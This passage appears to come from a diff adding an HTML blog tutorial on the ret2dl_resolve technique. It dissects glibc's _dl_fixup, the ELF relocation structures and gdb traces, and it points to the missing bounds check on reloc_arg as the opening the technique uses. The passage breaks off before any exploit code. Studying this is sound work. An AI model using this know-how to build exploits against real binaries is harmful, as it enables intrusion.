+   <span class="n">result</span> <span class="o">=</span> <span class="n">_dl_lookup_symbol_x</span> <span class="p">(</span><span class="n">strtab</span> <span class="o">+</span> <span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_name</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sym</span><span class="p">,</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_scope</span><span class="p">,</span>
+                                 <span class="n">version</span><span class="p">,</span> <span class="n">ELF_RTYPE_CLASS_PLT</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+   <span class="cm">/* We are done with the global scope.  */</span>
+   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">RTLD_SINGLE_THREAD_P</span><span class="p">)</span>
+     <span class="n">THREAD_GSCOPE_RESET_FLAG</span> <span class="p">();</span>
+
+<span class="cp">#ifdef RTLD_FINALIZE_FOREIGN_CALL
+</span>   <span class="n">RTLD_FINALIZE_FOREIGN_CALL</span><span class="p">;</span>
+<span class="cp">#endif
+</span>
+   <span class="cm">/* Currently result contains the base load address (or link map)
+      of the object that defines sym.  Now add in the symbol
+      offset.  */</span>
+   <span class="n">value</span> <span class="o">=</span> <span class="n">DL_FIXUP_MAKE_VALUE</span> <span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">SYMBOL_ADDRESS</span> <span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">sym</span><span class="p">,</span> <span class="nb">false</span><span class="p">));</span>
+ <span class="p">}</span>
+<span class="k">else</span>
+ <span class="p">{</span>
+   <span class="cm">/* We already found the symbol.
+      the module (and therefore its load address) is also known. */</span>
+   <span class="n">value</span> <span class="o">=</span> <span class="n">DL_FIXUP_MAKE_VALUE</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">SYMBOL_ADDRESS</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">sym</span><span class="p">,</span> <span class="nb">true</span><span class="p">));</span>
+   <span class="n">result</span> <span class="o">=</span> <span class="n">l</span><span class="p">;</span>
+ <span class="p">}</span>
+
+<span class="cm">/* And now perhaps the relocation addend.  */</span>
+<span class="n">value</span> <span class="o">=</span> <span class="n">elf_machine_plt_value</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">reloc</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="n">sym</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">ELFW</span><span class="p">(</span><span class="n">ST_TYPE</span><span class="p">)</span> <span class="p">(</span><span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_info</span><span class="p">)</span> <span class="o">==</span> <span class="n">STT_GNU_IFUNC</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+  <span class="n">value</span> <span class="o">=</span> <span class="n">elf_ifunc_invoke</span> <span class="p">(</span><span class="n">DL_FIXUP_VALUE_ADDR</span> <span class="p">(</span><span class="n">value</span><span class="p">));</span>
+
+<span class="cm">/* Finally, fix up the plt itself.  */</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">GLRO</span><span class="p">(</span><span class="n">dl_bind_not</span><span class="p">)))</span>
+  <span class="k">return</span> <span class="n">value</span><span class="p">;</span>
+
+<span class="k">return</span> <span class="n">elf_machine_fixup_plt</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">result</span><span class="p">,</span> <span class="n">refsym</span><span class="p">,</span> <span class="n">sym</span><span class="p">,</span> <span class="n">reloc</span><span class="p">,</span> <span class="n">rel_addr</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
+
+<span class="p">}</span>
+
+<span class="p">...</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>We can see at line 8, that the function accepts two arguments:</p>
+<figure class="highlight"><pre><code class="language-c" data-lang="c"> <span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l</span><span class="p">,</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Word</span><span class="p">)</span> <span class="n">reloc_arg</span> </code></pre></figure>
+<p>These are the arguments that have been previously pushed on the stack and then moved respectively in RDI and RSI.</p>
+
+<p><a href="https://code.woboq.org/userspace/glibc/include/link.h.html#link_map">link_map</a> is an important structure that contains all sort of information regarding a loaded shared object. The linker creates a linked list of link_maps and each link_map structure describes a shared object.</p>
+
+<p><strong>reloc_arg</strong> will be used as index to identify the corresponding Elf64_Rel in the JMPREL section.</p>
+
+<p>At line 10, a pointer to the STRTAB section is defined:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">strtab</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">D_PTR</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_STRTAB</span><span class="p">]);</span></code></pre></figure>
+
+<p><a href="https://code.woboq.org/userspace/glibc/include/link.h.html#link_map::l_info">l_info</a> (that is located at &amp;link_map + 0x40 and points in the dynamic section), accepts a tag as index, in this case <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html#_M/DT_STRTAB">DT_STRTAB</a>, defined as <code class="highlighter-rouge">#define DT_STRTAB  5</code>, then is passed as second argument to D_PTR macro. <a href="https://code.woboq.org/userspace/glibc/sysdeps/generic/ldsodefs.h.html#61">D_PTR</a> is defined as <code class="highlighter-rouge">D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr + (map)-&gt;l_addr)</code> if the dynamic section is read only, <code class="highlighter-rouge">D_PTR(map, i) (map)-&gt;i-&gt;d_un.d_ptr</code> otherwise. It’s used to find the d_ptr value in the corresponding Elf64_Dyn structure in the DYNAMIC section (which acts as a sort of “road map” for the dynamic linker). A <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html#Elf64_Dyn">Elf64_Dyn</a> structure is defined as follow:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span><span class="p">{</span>
+
+  <span class="n">Elf64_Sxword</span>    <span class="n">d_tag</span><span class="p">;</span>    <span class="cm">/* Dynamic entry type */</span>
+  <span class="k">union</span>
+    <span class="p">{</span>
+      <span class="n">Elf64_Xword</span>   <span class="n">d_val</span><span class="p">;</span>  <span class="cm">/* Integer value */</span>
+      <span class="n">Elf64_Addr</span>    <span class="n">d_ptr</span><span class="p">;</span>  <span class="cm">/* Address value */</span>
+    <span class="p">}</span> <span class="n">d_un</span><span class="p">;</span>
+
+<span class="p">}</span> <span class="n">Elf64_Dyn</span><span class="p">;</span></code></pre></figure>
+
+<p>All this results in <code class="highlighter-rouge">l-&gt;l_info[5]-&gt;d_un.d_ptr</code>, the STRTAB address, <code class="highlighter-rouge">0x400388</code> in our case.</p>
+
+<p>At line 11, a pointer to a Elf64_Rel structure is defined:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">const</span> <span class="n">PLTREL</span> <span class="o">*</span><span class="k">const</span> <span class="n">reloc</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">D_PTR</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_JMPREL</span><span class="p">])</span> <span class="o">+</span> <span class="n">reloc_offset</span><span class="p">);</span></code></pre></figure>
+
+<p>Similar to the previous line, l_info and D_PTR are used to obtain the JMPREL section address, but here, reloc_offset is added.
+<a href="https://code.woboq.org/userspace/glibc/sysdeps/x86_64/dl-runtime.c.html#_M/reloc_offset">reloc_offset</a>
+is defined as <code class="highlighter-rouge">reloc_arg * sizeof (PLTREL) = reloc_arg * 0x18</code>.
+We can also notice the <strong>total absence of upper boundaries checks</strong>. This, further on, will allow us to perform the ret2dl_resolve technique, using a large reloc_arg.</p>
+
+<p>At line 12, a pointer to a Elf64_Sym stucture is defined:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">const</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="n">sym</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">symtab</span><span class="p">[</span><span class="n">ELFW</span><span class="p">(</span><span class="n">R_SYM</span><span class="p">)</span> <span class="p">(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)];</span></code></pre></figure>
+
+<p>To better understand this line, we need to follow some definitions.
+<a href="https://code.woboq.org/userspace/glibc/elf/link.h.html#_M/ElfW">ElfW(type)</a> is defined as:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define ElfW(type)        _ElfW (Elf, __ELF_NATIVE_CLASS, type)
+#define _ElfW(e,w,t)      _ElfW_1 (e, w, _##t)
+#define _ElfW_1(e,w,t)    e##w##t</span></code></pre></figure>
+
+<p>This means that:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">ElfW</span><span class="p">(</span><span class="n">R_SYM</span><span class="p">)</span> <span class="o">=</span>
+<span class="n">_ElfW</span><span class="p">(</span><span class="n">Elf</span><span class="p">,</span> <span class="n">__ELF_NATIVE_CLASS</span><span class="p">,</span> <span class="n">R_SYM</span><span class="p">)</span> <span class="o">=</span>
+<span class="n">_ElfW_1</span><span class="p">(</span><span class="n">Elf</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">_R_SYM</span><span class="p">)</span> <span class="o">=</span>
+<span class="n">Elf64_R_SYM</span></code></pre></figure>
+
+<p>and <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html#_M/ELF64_R_SYM">ELF64_R_SYM(i)</a> is defined as: <code class="highlighter-rouge">ELF64_R_SYM(i)  ((i) &gt;&gt; 32)</code>, so we can read the line 12 as:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">const</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="n">sym</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">symtab</span><span class="p">[</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">];</span></code></pre></figure>
+
+<p>Basically it’s using <code class="highlighter-rouge">reloc-&gt;r_info &gt;&gt; 32</code> as index, to find the corresponding Elf64_Sym structure in the SYMTAB section.</p>
+
+<p>At line 14, we have:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="o">*</span><span class="k">const</span> <span class="n">rel_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_addr</span> <span class="o">+</span> <span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_offset</span><span class="p">);</span></code></pre></figure>
+
+<p><strong>rel_addr</strong> is a pointer to the location where the resolved symbol will be stored (in the GOT).</p>
+
+<p>At line 20, there’s an important check:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">assert</span> <span class="p">(</span><span class="n">ELFW</span><span class="p">(</span><span class="n">R_TYPE</span><span class="p">)(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)</span> <span class="o">==</span> <span class="n">ELF_MACHINE_JMP_SLOT</span><span class="p">);</span></code></pre></figure>
+
+<p><a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html#_M/ELF64_R_TYPE">Elf64_R_TYPE</a> is defined as <code class="highlighter-rouge">ELF64_R_TYPE(i) ((i) &amp; 0xffffffff)</code> and <a href="https://code.woboq.org/userspace/glibc/sysdeps/x86_64/dl-machine.h.html#_M/ELF_MACHINE_JMP_SLOT">ELF_MACHINE_JMP_SLOT</a> is defined as <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html#_M/R_X86_64_JUMP_SLOT">R_X86_64_JUMP_SLOT</a> that is equal to 7.</p>
+
+<p>So the line 20 is nothing more than:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">assert</span> <span class="p">((</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x7</span><span class="p">);</span></code></pre></figure>
+
+<p>Basically it’s checking if reloc-&gt;r_info is a valid JUMP_SLOT.</p>
+
+<p>At line 24, there’s another check:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">ELFW</span><span class="p">(</span><span class="n">ST_VISIBILITY</span><span class="p">)</span> <span class="p">(</span><span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_other</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span></code></pre></figure>
+
+<p><a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html#_M/ELF64_ST_VISIBILITY">ELF64_ST_VISIBILITY</a> corresponds to <code class="highlighter-rouge">ELF32_ST_VISIBILITY(o) ((o) &amp; 0x03)</code>, so the line 24 is equal to:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">((</span><span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_other</span> <span class="o">&amp;</span> <span class="mh">0x03</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span></code></pre></figure>
+
+<p>If the check is <strong>not</strong> satisfied, the symbol is considered already resolved, otherwise the code inside the “if” statement is executed. It starts with a symbol versioning check at line 28:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="n">VERSYMIDX</span> <span class="p">(</span><span class="n">DT_VERSYM</span><span class="p">)]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span></code></pre></figure>
+
+<p><a href="https://code.woboq.org/userspace/glibc/sysdeps/generic/ldsodefs.h.html#_M/VERSYMIDX">VERSYMIDX</a> is defined as:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define VERSYMIDX(sym) (DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGIDX(sym))</span></code></pre></figure>
+
+<p><a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html#_M/DT_VERSYM">DT_VERSYM</a>, <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html#_M/DT_NUM">DT_NUM</a>, <a href="https://code.woboq.org/userspace/glibc/sysdeps/generic/dl-dtprocnum.h.html#_M/DT_THISPROCNUM">DT_THISPROCNUM</a>, <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html#_M/DT_VERNEEDNUM">DT_VERNEEDNUM</a> and <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html#_M/DT_VERSIONTAGIDX">DT_VERSIONTAGIDX</a>
+correspond to:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define DT_VERSYM   0x6ffffff0
+#define DT_NUM    35    </span><span class="cm">/* Number used */</span><span class="cp">
+#define DT_THISPROCNUM    0
+#define DT_VERNEEDNUM   0x6fffffff    </span><span class="cm">/* Number of needed versions */</span><span class="cp">
+#define DT_VERSIONTAGIDX(tag)   (DT_VERNEEDNUM - (tag))   </span><span class="cm">/* Reverse order! */</span></code></pre></figure>
+
+<p>So <code class="highlighter-rouge">VERSYMIDX(DT_VERSYM)</code> is equal to:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">VERSYMIDX</span><span class="p">(</span><span class="mh">0x6ffffff0</span><span class="p">)</span> <span class="o">=</span>
+<span class="p">(</span><span class="n">DT_NUM</span> <span class="o">+</span> <span class="n">DT_THISPROCNUM</span> <span class="o">+</span> <span class="n">DT_VERSIONTAGIDX</span><span class="p">(</span><span class="mh">0x6ffffff0</span><span class="p">))</span> <span class="o">=</span>
+<span class="p">(</span><span class="mi">35</span> <span class="o">+</span> <span class="mi">0</span> <span class="o">+</span> <span class="n">DT_VERSIONTAGIDX</span><span class="p">(</span><span class="mh">0x6ffffff0</span><span class="p">))</span> <span class="o">=</span>
+<span class="p">(</span><span class="mi">35</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0x6fffffff</span> <span class="o">-</span> <span class="mh">0x6ffffff0</span><span class="p">))</span> <span class="o">=</span>
+<span class="p">(</span><span class="mi">35</span> <span class="o">+</span> <span class="mh">0xf</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x32</span></code></pre></figure>
+
+<p>Consequently we have:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="o">&amp;</span><span class="n">l</span> <span class="p">(</span><span class="n">link_map</span> <span class="n">address</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x40</span> <span class="p">(</span><span class="n">l_info</span> <span class="n">off</span><span class="p">)</span> <span class="o">+</span> <span class="n">VERSYMIDX</span><span class="p">(</span><span class="mh">0x6ffffff0</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x8</span> <span class="p">(</span><span class="n">address</span> <span class="n">size</span><span class="p">)</span> <span class="o">=</span>
+<span class="o">&amp;</span><span class="n">l</span> <span class="o">+</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="mh">0x32</span> <span class="o">*</span> <span class="mh">0x8</span> <span class="o">=</span>
+<span class="o">&amp;</span><span class="n">l</span> <span class="o">+</span> <span class="mh">0x1d0</span></code></pre></figure>
+
+<p>So, if <code class="highlighter-rouge">(&amp;l + 0x1d0) != NULL</code>, and usually it is, for example in our case:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mh">0x7ffff7fe2a81</span> <span class="o">&lt;</span><span class="n">_dl_fixup</span><span class="o">+</span><span class="mi">97</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">r8</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">r10</span><span class="o">+</span><span class="mh">0x1d0</span><span class="err">]</span>
+<span class="mh">0x7ffff7fe2a88</span> <span class="o">&lt;</span><span class="n">_dl_fixup</span><span class="o">+</span><span class="mi">104</span><span class="o">&gt;:</span>	<span class="k">test</span>   <span class="n">r8</span><span class="p">,</span><span class="n">r8</span></code></pre></figure>
+
+<p>where R10 contains the link_map address and <code class="highlighter-rouge">QWORD PTR [r10+0x1d0]</code>, moved in in R8, corresponds to the address of the VERSYM tag in the DYNAMIC section:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">R8</span>  <span class="mh">0x403f80</span> <span class="p">(</span><span class="n">_DYNAMIC</span><span class="o">+</span><span class="mi">352</span><span class="p">)</span> <span class="o">&lt;--</span> <span class="mh">0x6ffffff0</span></code></pre></figure>
+
+<p>the code in the “if” statement is executed:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">const</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Half</span><span class="p">)</span> <span class="o">*</span><span class="n">vernum</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">VERSYMIDX</span> <span class="p">(</span><span class="n">DT_VERSYM</span><span class="p">)]);</span>
+<span class="n">ElfW</span><span class="p">(</span><span class="n">Half</span><span class="p">)</span> <span class="n">ndx</span> <span class="o">=</span> <span class="n">vernum</span><span class="p">[</span><span class="n">ELFW</span><span class="p">(</span><span class="n">R_SYM</span><span class="p">)</span> <span class="p">(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="mh">0x7fff</span><span class="p">;</span>
+<span class="n">version</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_versions</span><span class="p">[</span><span class="n">ndx</span><span class="p">];</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">version</span><span class="o">-&gt;</span><span class="n">hash</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="n">version</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span></code></pre></figure>
+
+<p>It obtains the VERSYM address using the usual l_info and D_PTR macro, then calculates “ndx” using <code class="highlighter-rouge">reloc-&gt;r_info &gt;&gt; 32</code> as index in the VERSYM section. “ndx” is subsequently used as index in <a href="https://code.woboq.org/userspace/glibc/include/link.h.html#link_map::l_versions">l_versions</a> (that is located at &amp;link_map + 0x2e8 and is an array with version names), to obtain the version name.</p>
+
+<p>Mind this point, we will analyze it in gdb in the exploit part.</p>
+
+<p>Finally, at line 48, <a href="https://code.woboq.org/userspace/glibc/elf/dl-lookup.c.html#786">_dl_lookup_symbol_x</a> is called, followed by <a href="https://code.woboq.org/userspace/glibc/sysdeps/generic/dl-lookupcfg.h.html#_M/DL_FIXUP_MAKE_VALUE">DL_FIXUP_MAKE_VALUE</a> at line 62 and <a href="https://code.woboq.org/userspace/glibc/sysdeps/x86_64/dl-machine.h.html#237">elf_machine_fixup_plt</a> at line 82:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">result</span> <span class="o">=</span> <span class="n">_dl_lookup_symbol_x</span> <span class="p">(</span><span class="n">strtab</span> <span class="o">+</span> <span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_name</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sym</span><span class="p">,</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_scope</span><span class="p">,</span>
+                                <span class="n">version</span><span class="p">,</span> <span class="n">ELF_RTYPE_CLASS_PLT</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span></code></pre></figure>
+
+<p>_dl_lookup_symbol_x searches loaded objects’ symbol table for a definition of the symbol in <code class="highlighter-rouge">strtab + sym-&gt;st_name</code>. It returns the address of the linkmap structure, and <a href="https://code.woboq.org/userspace/glibc/include/link.h.html#link_map::l_addr">l_addr</a>, the first element in the structure, points to the libc base address.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">value</span> <span class="o">=</span> <span class="n">DL_FIXUP_MAKE_VALUE</span> <span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">SYMBOL_ADDRESS</span> <span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">sym</span><span class="p">,</span> <span class="nb">false</span><span class="p">));</span>
+<span class="p">...</span>
+<span class="k">return</span> <span class="n">elf_machine_fixup_plt</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">result</span><span class="p">,</span> <span class="n">refsym</span><span class="p">,</span> <span class="n">sym</span><span class="p">,</span> <span class="n">reloc</span><span class="p">,</span> <span class="n">rel_addr</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span></code></pre></figure>
+
+<p>DL_FIXUP_MAKE_VALUE finds the offset of the function in the library, relocates it and stores the result in the <code class="highlighter-rouge">value</code> variable. To do that, it uses the <a href="https://code.woboq.org/userspace/glibc/sysdeps/generic/ldsodefs.h.html#_M/SYMBOL_ADDRESS">SYMBOL_ADDRESS</a> macro, defined as:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define SYMBOL_ADDRESS(map, ref, map_set)                           \
+  ((ref) == NULL ? 0                                                \
+    : (__glibc_unlikely ((ref)-&gt;st_shndx == SHN_ABS) ? 0            \
+      : LOOKUP_VALUE_ADDRESS (map, map_set)) + (ref)-&gt;st_value)</span></code></pre></figure>
+
+<p>Where <a href="https://code.woboq.org/userspace/glibc/sysdeps/generic/ldsodefs.h.html#_M/LOOKUP_VALUE_ADDRESS">LOOKUP_VALUE_ADDRESS</a> corresponds to:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define LOOKUP_VALUE_ADDRESS(map, set) ((set) || (map) ? (map)-&gt;l_addr : 0)</span></code></pre></figure>
+
+<p>If everything goes well, it will result in:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">value</span> <span class="o">=</span> <span class="n">DL_FIXUP_MAKE_VALUE</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_addr</span> <span class="o">+</span> <span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_value</span><span class="p">);</span></code></pre></figure>
+
+<p>We can see it in gdb, a couple of instructions after the _dl_lookup_symbol_x call:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">  <span class="mh">0x7ffff7fe2b1c</span> <span class="o">&lt;</span><span class="n">_dl_fixup</span><span class="o">+</span><span class="mi">252</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span> <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[r8]</span>
+  <span class="mh">0x7ffff7fe2b1f</span> <span class="o">&lt;</span><span class="n">_dl_fixup</span><span class="o">+</span><span class="mi">255</span><span class="o">&gt;</span>    <span class="k">add</span>    <span class="n">rax</span><span class="p">,</span> <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mi">8</span><span class="err">]</span></code></pre></figure>
+
+<p>In the first instruction, the r8 contains the link map address, and l_addr is pointing to the libc base address:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">R8</span>   <span class="mh">0x7ffff7fae000</span> <span class="o">--&gt;</span> <span class="mh">0x7ffff7deb000</span> <span class="o">&lt;--</span> <span class="mh">0x3010102464c457f</span></code></pre></figure>
+
+<p>In the second instruction, the rdx is pointing to the location of the corresponding Elf64_Sym structure in libc, found using _dl_lookup_symbol_x:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">RDX</span>  <span class="mh">0x7ffff7df7cd0</span> <span class="o">&lt;--</span> <span class="mh">0xe001200002049</span></code></pre></figure>
+
+<p>So it moves the libc base address in rax, and then adds to it the value pointed by rdx + 0x8.
+<code class="highlighter-rouge">$rdx + 0x8 = 0x7ffff7df7cd0 + 0x8 = 0x7ffff7df7cd8</code> and corresponds to the location of the <strong>st_value</strong> field in the Elf64_Sym structure:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mh">0x7ffff7df7cd8</span><span class="o">:</span>	<span class="mh">0x00000000000ee550</span></code></pre></figure>
+
+<p>So we have: <code class="highlighter-rouge">rax + QWORD PTR [rdx + 8] = libc base address + st_value = 0x7ffff7deb000 + 0xee550 = 0x7ffff7ed9550</code>, the location of the read() function in libc!</p>
+
+<p>Now that the relocation is complete, elf_machine_fixup_plt
+writes the address of the resolved symbol in the location pointed by rel_addr (In the GOT).</p>
+
+<p>Let’s do a quick recap:</p>
+
+<ol>
+  <li>
+    <p><code class="highlighter-rouge">_dl_fixup(link_map, reloc_arg)</code> is called.</p>
+  </li>
+  <li>
+    <p><code class="highlighter-rouge">const PLTREL *const reloc = (const void *) (JMPREL + reloc_offset);</code></p>
+
+    <p>_dl_fixup, based on the value of reloc_offset (reloc_arg * 0x18),
+searchs in .rela.plt for the corresponding Elf64_Rel structure</p>
+  </li>
+  <li>
+    <p><code class="highlighter-rouge">const ElfW(Sym) *sym = &amp;symtab[reloc-&gt;r_info &gt;&gt; 32];</code></p>
+
+    <p>It uses the  <code class="highlighter-rouge">reloc-&gt;r_info &gt;&gt; 32</code> field in Elf64_Rel struct, as an index to find the corresponding Elf64_Sym structure in the SYMTAB section.</p>
+  </li>
+  <li>
+    <p><code class="highlighter-rouge">assert ((reloc-&gt;r_info &amp; 0xffffffff) == 0x7);</code></p>
+
+    <p>Using r_info in the Elf64_Rel structure, it ensures it’s looking at a valid JUMP_SLOT.</p>
+  </li>
+  <li>
+    <p><code class="highlighter-rouge">if (__builtin_expect ((sym-&gt;st_other &amp; 0x03), 0) == 0)</code></p>
+
+    <p>Using st_other in the Elf64_Sym structure, it ensures the symbol is not already resolved.
+<code class="highlighter-rouge">(sym-&gt;st_other &amp; 3) != 0</code>–&gt; symbol already resolved, so we need to have st_other == 0.</p>
+  </li>
+  <li>
+    <p><code class="highlighter-rouge">if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)</code></p>
+
+    <p>It performs a symbol versioning check. Usually, this check is satisfied, so it computes “ndx” from <code class="highlighter-rouge">ElfW(Half) ndx = vernum[reloc-&gt;r_info &gt;&gt; 32] &amp; 0x7fff;</code> and then obtains the version number from <code class="highlighter-rouge">version = &amp;l-&gt;l_versions[ndx];</code>.</p>
+  </li>
+  <li>
+    <p><code class="highlighter-rouge">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,
+                               version, ELF_RTYPE_CLASS_PLT, flags, NULL);</code></p>
+
